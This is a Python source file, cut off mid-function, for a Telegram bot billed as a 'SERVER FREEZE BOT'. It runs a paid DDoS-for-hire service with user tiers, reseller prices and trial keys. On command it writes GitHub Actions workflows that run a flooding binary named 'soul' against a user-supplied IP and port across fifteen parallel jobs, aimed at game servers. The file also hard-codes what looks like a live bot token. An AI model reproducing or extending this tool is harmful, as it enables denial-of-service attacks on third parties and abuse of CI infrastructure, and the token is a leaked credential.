import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler, ConversationHandler
from github import Github, GithubException

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8330044393:AAFlCdOUi_B1JeNYhQHJPAZeAviJkW7G-i0"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
ADMIN_IDS = [8101867786]
OWNER_IDS = [8101867786]

WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_TARGET = 3
WAITING_FOR_DURATION = 4
WAITING_FOR_REDEEM_CODE = 5
WAITING_FOR_ADD_USER = 6
WAITING_FOR_ADD_DAYS = 7
WAITING_FOR_REMOVE_USER = 8
WAITING_FOR_ADD_TOKEN = 9
WAITING_FOR_REMOVE_TOKEN = 10
WAITING_FOR_ADD_OWNER = 11
WAITING_FOR_DELETE_OWNER = 12
WAITING_FOR_ADD_RESELLER = 13
WAITING_FOR_REMOVE_RESELLER = 14
WAITING_FOR_COOLDOWN = 15
WAITING_FOR_MAX_ATTACK = 16
WAITING_FOR_TRIAL_HOURS = 17

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 100
user_attack_counts = {}
attack_threads = {}

USER_PRICES = {"1": 120, "2": 240, "3": 360, "4": 450, "7": 650}
RESELLER_PRICES = {"1": 150, "2": 250, "3": 300, "4": 400, "7": 550}

def load_json(filename, default):
    try:
        with open(filename, 'r') as f:
            data = json.load(f)
            return data if data else default
    except FileNotFoundError:
        return default

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

def load_users():
    users = load_json('users.json', ADMIN_IDS.copy())
    if not users:
        users = ADMIN_IDS.copy()
        save_json('users.json', users)
    return set(users)

def save_users(users):
    save_json('users.json', list(users))

def load_pending_users():
    return load_json('pending_users.json', [])

def save_pending_users(pending_users):
    save_json('pending_users.json', pending_users)

def load_approved_users():
    return load_json('approved_users.json', {})

def save_approved_users(approved_users):
    save_json('approved_users.json', approved_users)

def load_owners():
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "added_by": "system", "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "is_primary": True}
        save_json('owners.json', owners)
    return owners

def save_owners(owners):
    save_json('owners.json', owners)

def load_admins():
    return load_json('admins.json', {})

def save_admins(admins):
    save_json('admins.json', admins)

def load_groups():
    return load_json('groups.json', {})

def save_groups(groups):
    save_json('groups.json', groups)

def load_resellers():
    return load_json('resellers.json', {})

def save_resellers(resellers):
    save_json('resellers.json', resellers)

def load_github_tokens():
    return load_json('github_tokens.json', [])

def save_github_tokens(tokens):
    save_json('github_tokens.json', tokens)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {"current_attack": current_attack, "cooldown_until": cooldown_until}
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    data = load_json('maintenance.json', {"maintenance": False})
    return data.get("maintenance", False)

def save_maintenance_mode(mode):
    save_json('maintenance.json', {"maintenance": mode})

def load_cooldown():
    data = load_json('cooldown.json', {"cooldown": 40})
    return data.get("cooldown", 40)

def save_cooldown(duration):
    save_json('cooldown.json', {"cooldown": duration})

def load_max_attacks():
    data = load_json('max_attacks.json', {"max_attacks": 100})
    return data.get("max_attacks", 100)

def save_max_attacks(max_attacks):
    save_json('max_attacks.json', {"max_attacks": max_attacks})

def load_trial_keys():
    return load_json('trial_keys.json', {})

def save_trial_keys(keys):
    save_json('trial_keys.json', keys)

def load_user_attack_counts():
    return load_json('user_attack_counts.json', {})

def save_user_attack_counts(counts):
    save_json('user_attack_counts.json', counts)

authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
user_attack_counts = load_user_attack_counts()
trial_keys = load_trial_keys()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)

def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global current_attack, cooldown_until
    if MAINTENANCE_MODE:
        return False, "⚠️ MAINTENANCE MODE\nBot is under maintenance. Please wait."
    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    if current_count >= MAX_ATTACKS:
        return False, f"⚠️ MAXIMUM ATTACK LIMIT REACHED\nYou have used all {MAX_ATTACKS} attack(s). Contact admin for more."
    if current_attack is not None:
        return False, "⚠️ ERROR: ATTACK ALREADY RUNNING\nPlease wait until the current attack finishes or 40 seconds cooldown."
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, f"⏳ COOLDOWN REMAINING\nPlease wait {remaining_time} seconds before starting new attack."
    return True, "✅ Ready to start attack"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "GAME"
    elif ip.startswith(('15', '96')):
        return None, "⚠️ Invalid IP - IPs starting with '15' or '96' are not allowed"
    else:
        return "BGMI FLOOD", "GAME"

def is_valid_ip(ip):
    return not ip.startswith(('15', '96'))

def start_attack(ip, port, time_val, user_id, method):
    global current_attack
    current_attack = {"ip": ip, "port": port, "time": time_val, "user_id": user_id, "method": method, "start_time": time.time(), "estimated_end_time": time.time() + int(time_val)}
    save_attack_state()
    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until
    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))
        return {"status": "running", "attack": current_attack, "elapsed": elapsed, "remaining": remaining}
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {"status": "cooldown", "remaining_cooldown": remaining_cooldown}
    return {"status": "ready"}

def generate_trial_key(hours):
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    expiry = time.time() + (hours * 3600)
    trial_keys[key] = {"hours": hours, "expiry": expiry, "used": False, "used_by": None, "created_at": time.time(), "created_by": "system"}
    save_trial_keys(trial_keys)
    return key

def redeem_trial_key(key, user_id):
    user_id_str = str(user_id)
    if key not in trial_keys:
        return False, "Invalid key"
    key_data = trial_keys[key]
    if key_data["used"]:
        return False, "Key already used"
    if time.time() > key_data["expiry"]:
        return False, "Key expired"
    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)
    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {"username": f"user_{user_id}", "added_by": "trial_key", "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "expiry": expiry, "days": key_data["hours"] / 24, "trial": True}
    save_approved_users(approved_users)
    return True, f"Trial key activated! Access granted for {key_data['hours']} hours"

def create_repository(token, repo_name):
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except:
            repo = user.create_repo(repo_name, private=False, auto_init=True)
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: soul Attack
on: [push]

jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Update attack parameters - {ip}:{port} ({method})", yml_content, file_content.sha)
            logger.info(f"✅ Updated configuration for {repo_name}")
        except:
            repo.create_file(YML_FILE_PATH, f"Create attack parameters - {ip}:{port} ({method})", yml_content)
            logger.info(f"✅ Created configuration for {repo_name}")
        return True
    except Exception as e:
        logger.error(f"❌ Error for {repo_name}: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        running_statuses = ['queued', 'in_progress', 'pending']
        total_cancelled = 0
        for status in running_statuses:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                        logger.info(f"✅ INSTANT STOP: Cancelled {status} workflow {workflow.id} for {repo_name}")
                    except Exception as e:
                        logger.error(f"❌ Error cancelling workflow {workflow.id}: {e}")
            except Exception as e:
                logger.error(f"❌ Error getting {status} workflows: {e}")
        return total_cancelled
    except Exception as e:
        logger.error(f"❌ Error accessing {repo_name}: {e}")
        return 0

def create_main_keyboard(user_id):
    keyboard = []
    if can_user_attack(user_id):
        keyboard.append([InlineKeyboardButton("🚀 Launch Attack", callback_data="launch_attack"), InlineKeyboardButton("📊 Check Status", callback_data="check_status")])
        keyboard.append([InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack"), InlineKeyboardButton("🔑 My Access", callback_data="my_access")])
    keyboard.append([InlineKeyboardButton("👥 User Management", callback_data="user_management"), InlineKeyboardButton("⚙️ Bot Settings", callback_data="bot_settings")])
    if is_owner(user_id):
        keyboard.append([InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel"), InlineKeyboardButton("🔐 Token Management", callback_data="token_management")])
    keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help_menu")])
    return InlineKeyboardMarkup(keyboard)

def create_user_management_keyboard(user_id):
    keyboard = []
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([InlineKeyboardButton("➕ Add User", callback_data="add_user_prompt"), InlineKeyboardButton("➖ Remove User", callback_data="remove_user_prompt")])
        keyboard.append([InlineKeyboardButton("📋 Users List", callback_data="users_list"), InlineKeyboardButton("✅ Approved Users", callback_data="approved_users_list")])
    if is_owner(user_id):
        keyboard.append([InlineKeyboardButton("👑 Owner List", callback_data="owner_list"), InlineKeyboardButton("👮 Admin List", callback_data="admin_list")])
        keyboard.append([InlineKeyboardButton("💼 Reseller List", callback_data="reseller_list")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
    return InlineKeyboardMarkup(keyboard)

def create_bot_settings_keyboard(user_id):
    keyboard = []
    if is_owner(user_id):
        keyboard.append([InlineKeyboardButton("🔧 Maintenance", callback_data="toggle_maintenance"), InlineKeyboardButton("⏱️ Set Cooldown", callback_data="set_cooldown_prompt")])
        keyboard.append([InlineKeyboardButton("🎯 Set Max Attack", callback_data="set_max_attack_prompt"), InlineKeyboardButton("🎫 Gen Trial Key", callback_data="gen_trial_key_prompt")])
        keyboard.append([InlineKeyboardButton("🗑️ Remove Expired", callback_data="remove_expired_tokens")])
    keyboard.append([InlineKeyboardButton("💰 Price List", callback_data="price_list"), InlineKeyboardButton("💎 Reseller Prices", callback_data="reseller_price_list")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
    return InlineKeyboardMarkup(keyboard)

def create_owner_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Owner", callback_data="add_owner_prompt"), InlineKeyboardButton("➖ Delete Owner", callback_data="delete_owner_prompt")],
        [InlineKeyboardButton("➕ Add Reseller", callback_data="add_reseller_prompt"), InlineKeyboardButton("➖ Remove Reseller", callback_data="remove_reseller_prompt")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast_prompt"), InlineKeyboardButton("📊 List Groups", callback_data="list_groups")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_token_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Token", callback_data="add_token_prompt"), InlineKeyboardButton("📋 View Tokens", callback_data="view_tokens")],
        [InlineKeyboardButton("➖ Remove Token", callback_data="remove_token_prompt"), InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary_prompt")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    chat_type = update.effective_chat.type
    if chat_type in ['group', 'supergroup']:
        chat_id = str(update.effective_chat.id)
        if chat_id not in groups:
            groups[chat_id] = {"name": update.effective_chat.title, "added_date": time.strftime("%Y-%m-%d %H:%M:%S")}
            save_groups(groups)
    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        text = "🔧 MAINTENANCE MODE\nBot is under maintenance.\nPlease wait until it's back."
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Try Again", callback_data="main_menu")]])
        if update.message:
            await update.message.reply_text(text, reply_markup=keyboard)
        elif update.callback_query:
            await update.callback_query.message.edit_text(text, reply_markup=keyboard)
        return
    if not can_user_attack(user_id):
        user_exists = False
        for user in pending_users:
            if str(user['user_id']) == str(user_id):
                user_exists = True
                break
        if not user_exists:
            pending_users.append({"user_id": user_id, "username": update.effective_user.username or f"user_{user_id}", "request_date": time.strftime("%Y-%m-%d %H:%M:%S")})
            save_pending_users(pending_users)
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(chat_id=int(owner_id), text=f"📥 NEW ACCESS REQUEST\nUser: @{update.effective_user.username or 'No username'}\nID: {user_id}\nUse /add {user_id} 7 to approve")
                except:
                    pass
        text = f"📋 ACCESS REQUEST SENT\nYour access request has been sent to admin.\nPlease wait for approval.\n\nUse /id to get your user ID\nUse /help for available commands\n\n💡 Want a trial?\nAsk admin for a trial key or redeem one with /redeem <key>"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])
        if update.message:
            await update.message.reply_text(text, reply_markup=keyboard)
        elif update.callback_query:
            await update.callback_query.message.edit_text(text, reply_markup=keyboard)
        return
    welcome_text = f"""╔═══════════════════════╗
║   SERVER FREEZE BOT   ║
╚═══════════════════════╝

👋 Welcome {username}!

⚡ Method: BGM FLOOD
🎯 Cooldown: {COOLDOWN_DURATION}s after attack
🔥 Remaining attacks: {MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)}/{MAX_ATTACKS}

Use buttons to continue:"""
    keyboard = create_main_keyboard(user_id)
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=keyboard)
    elif update.callback_query:
        await update.callback_query.message.edit_text(welcome_text, reply_markup=keyboard)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until, MAINTENANCE_MODE, COOLDOWN_DURATION, MAX_ATTACKS
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    data = query.data
    if data == "main_menu":
        context.user_data.clear()
        await start(update, context)
    elif data == "launch_attack":
        if not can_user_attack(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED\nYou don't have permission to launch attacks.\n\nContact owner for access.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        if MAINTENANCE_MODE:
            await query.message.edit_text("🔧 MAINTENANCE MODE\nBot is under maintenance. Try again later.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        if str(user_id) in approved_users:
            if approved_users[str(user_id)]['expiry'] != "LIFETIME":
                if time.time() > approved_users[str(user_id)]['expiry']:
                    await query.message.edit_text("❌ ACCESS EXPIRED\nYour access has expired. Please renew.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
                    return
        if current_attack:
            remaining = int(current_attack['estimated_end_time'] - time.time())
            await query.message.edit_text(f"⚠️ ATTACK ALREADY RUNNING\nTarget: {current_attack['ip']}:{current_attack['port']}\nTime remaining: {remaining}s", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        if time.time() < cooldown_until:
            remaining = int(cooldown_until - time.time())
            await query.message.edit_text(f"⏳ COOLDOWN ACTIVE\nWait {remaining} seconds before next attack.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        await query.message.edit_text("🎯 LAUNCH ATTACK\n\nEnter target details:\nFormat: <ip> <port> <duration>\n\nExample: 192.168.1.1 80 120\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]))
        context.user_data['waiting_for_attack_target'] = True
    elif data == "check_status":
        if current_attack:
            remaining = int(current_attack['estimated_end_time'] - time.time())
            status_text = f"""📊 ATTACK STATUS

🎯 Target: {current_attack['ip']}:{current_attack['port']}
⚡ Method: BGM FLOOD
⏱️ Duration: {current_attack['time']}s
⏳ Remaining: {remaining}s
👤 User: {current_attack['user_id']}
🔄 Status: RUNNING"""
        else:
            if time.time() < cooldown_until:
                remaining_cooldown = int(cooldown_until - time.time())
                status_text = f"""📊 SYSTEM STATUS

🔄 Status: IDLE
⏳ Cooldown: {remaining_cooldown}s
🔥 Max attacks: {MAX_ATTACKS}
⚙️ Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}"""
            else:
                status_text = f"""📊 SYSTEM STATUS

✅ Status: READY
🔥 Max attacks: {MAX_ATTACKS}
⚙️ Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}
💚 All systems operational"""
        await query.message.edit_text(status_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="check_status"), InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
    elif data == "stop_attack":
        if not current_attack:
            await query.message.edit_text("⚠️ NO ATTACK RUNNING\nThere is no active attack to stop.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        if current_attack['user_id'] != user_id and not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("⚠️ PERMISSION DENIED\nYou can only stop your own attacks.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        progress_msg = await query.message.edit_text("🛑 STOPPING ATTACK...")
        total_stopped = 0
        success_count = 0
        threads = []
        results = []
        def stop_single_token(token_data):
            try:
                stopped = instant_stop_all_jobs(token_data['token'], token_data['repo'])
                results.append((token_data['username'], stopped))
            except:
                results.append((token_data['username'], 0))
        for token_data in github_tokens:
            thread = threading.Thread(target=stop_single_token, args=(token_data,))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        for username, stopped in results:
            total_stopped += stopped
            if stopped > 0:
                success_count += 1
        with attack_lock:
            stopped_attack = current_attack
            current_attack = None
            cooldown_until = time.time() + COOLDOWN_DURATION
            save_attack_state()
        await progress_msg.edit_text(f"✅ ATTACK STOPPED\nTarget: {stopped_attack['ip']}:{stopped_attack['port']}\nWorkflows cancelled: {total_stopped}\nServers: {success_count}/{len(github_tokens)}\nCooldown: {COOLDOWN_DURATION}s", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
    elif data == "my_access":
        if not can_user_attack(user_id):
            await query.message.edit_text("❌ NO ACCESS\nYou don't have bot access.\n\nContact owner for access.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        if is_owner(user_id):
            role = "👑 PRIMARY OWNER" if is_primary_owner(user_id) else "👑 OWNER"
            expiry = "LIFETIME"
        elif is_admin(user_id):
            role = "🛡️ ADMIN"
            expiry = "LIFETIME"
        elif is_reseller(user_id):
            role = "💰 RESELLER"
            reseller_data = resellers.get(str(user_id), {})
            expiry = reseller_data.get('expiry', '?')
            if expiry != 'LIFETIME':
                try:
                    expiry_time = float(expiry)
                    if time.time() > expiry_time:
                        expiry = "EXPIRED"
                    else:
                        expiry = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                except:
                    pass
        elif is_approved_user(user_id):
            role = "👤 APPROVED USER"
            user_data = approved_users.get(str(user_id), {})
            expiry = user_data.get('expiry', '?')
            if expiry != 'LIFETIME':
                try:
                    expiry_time = float(expiry)
                    if time.time() > expiry_time:
                        expiry = "EXPIRED"
                    else:
                        expiry = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                except:
                    pass
        else:
            role = "⏳ PENDING"
            expiry = "Waiting"
        user_id_str = str(user_id)
        current_attacks = user_attack_counts.get(user_id_str, 0)
        remaining_attacks = MAX_ATTACKS - current_attacks
        access_text = f"""🔐 YOUR ACCESS INFO

• Role: {role}
• User ID: {user_id}
• Username: @{update.effective_user.username or 'No username'}
• Expiry: {expiry}
• Remaining attacks: {remaining_attacks}/{MAX_ATTACKS}

Attack access: {'✅ YES' if can_user_attack(user_id) else '❌ NO'}"""
        await query.message.edit_text(access_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
    elif data == "user_management":
        keyboard = create_user_management_keyboard(user_id)
        text = """👥 USER MANAGEMENT PANEL

Manage users, approvals, and permissions.

Select an option:"""
        await query.message.edit_text(text, reply_markup=keyboard)
    elif data == "add_user_prompt":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED\nOnly admins can add users.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        context.user_data.clear()
        await query.message.edit_text("➕ ADD USER\n\nEnter user ID and days:\nFormat: <user_id> <days>\n\nExample: 123456789 7\nUse 0 for lifetime access\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_add_user'] = True
    elif data == "remove_user_prompt":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED\nOnly admins can remove users.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text("➖ REMOVE USER\n\nEnter user ID to remove:\n\nExample: 123456789\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_remove_user'] = True
    elif data == "users_list":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        if not pending_users:
            await query.message.edit_text("📭 No pending requests", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        users_list = "⏳ PENDING REQUESTS\n\n"
        for user in pending_users:
            users_list += f"• {user['user_id']} - @{user['username']}\n"
        users_list += f"\n📊 Total: {len(pending_users)}\n\nClick button below to approve (7 days)\nor use: /add <id> <days>"
        keyboard = []
        for user in pending_users[:5]:
            keyboard.append([InlineKeyboardButton(f"✅ Approve {user['username']}", callback_data=f"approve_{user['user_id']}")])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="user_management")])
        await query.message.edit_text(users_list, reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "approved_users_list":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        if not approved_users:
            await query.message.edit_text("📭 No approved users", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        users_list = "👤 APPROVED USERS LIST\n\n"
        count = 1
        for uid, user_info in approved_users.items():
            username = user_info.get('username', f'user_{uid}')
            days = user_info.get('days', '?')
            expiry = user_info.get('expiry', 'LIFETIME')
            if expiry == "LIFETIME":
                remaining = "LIFETIME"
            else:
                try:
                    expiry_time = float(expiry)
                    current_time = time.time()
                    if current_time > expiry_time:
                        remaining = "EXPIRED"
                    else:
                        days_left = int((expiry_time - current_time) / (24 * 3600))
                        hours_left = int(((expiry_time - current_time) % (24 * 3600)) / 3600)
                        remaining = f"{days_left}d {hours_left}h"
                except:
                    remaining = "UNKNOWN"
            users_list += f"{count}. {uid} - @{username} ({days} days) | {remaining}\n"
            count += 1
        users_list += f"\n📊 Total: {len(approved_users)}"
        await query.message.edit_text(users_list, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif data == "owner_list":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        owners_list = "👑 OWNERS LIST\n\n"
        for owner_id, owner_info in owners.items():
            username = owner_info.get('username', f'owner_{owner_id}')
            is_primary = owner_info.get('is_primary', False)
            added_by = owner_info.get('added_by', 'system')
            owners_list += f"• {owner_id} - @{username}"
            if is_primary:
                owners_list += " 👑 (PRIMARY)"
            owners_list += f"\n  Added by: {added_by}\n"
        await query.message.edit_text(owners_list, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif data == "admin_list":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        if not admins:
            await query.message.edit_text("📭 No admins", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        admins_list = "🛡️ ADMINS LIST\n\n"
        for admin_id, admin_info in admins.items():
            username = admin_info.get('username', f'admin_{admin_id}')
            admins_list += f"• {admin_id} - @{username}\n"
        await query.message.edit_text(admins_list, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif data == "reseller_list":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        if not resellers:
            await query.message.edit_text("📭 No resellers", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        resellers_list = "💰 RESELLERS LIST\n\n"
        for reseller_id, reseller_info in resellers.items():
            username = reseller_info.get('username', f'reseller_{reseller_id}')
            credits = reseller_info.get('credits', 0)
            expiry = reseller_info.get('expiry', '?')
            if expiry != 'LIFETIME':
                try:
                    expiry_time = float(expiry)
                    expiry = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                except:
                    pass
            resellers_list += f"• {reseller_id} - @{username}\n  Credits: {credits} | Expiry: {expiry}\n"
        await query.message.edit_text(resellers_list, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif data == "bot_settings":
        keyboard = create_bot_settings_keyboard(user_id)
        text = """⚙️ BOT SETTINGS PANEL

Configure bot parameters and settings.

Select an option:"""
        await query.message.edit_text(text, reply_markup=keyboard)
    elif data == "toggle_maintenance":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED\nOnly owners can toggle maintenance.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        save_maintenance_mode(MAINTENANCE_MODE)
        status = "ENABLED" if MAINTENANCE_MODE else "DISABLED"
        await query.message.edit_text(f"🔧 MAINTENANCE MODE {status}\nMaintenance mode is now {'on' if MAINTENANCE_MODE else 'off'}.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif data == "set_cooldown_prompt":
        if not is_owner(user_id):
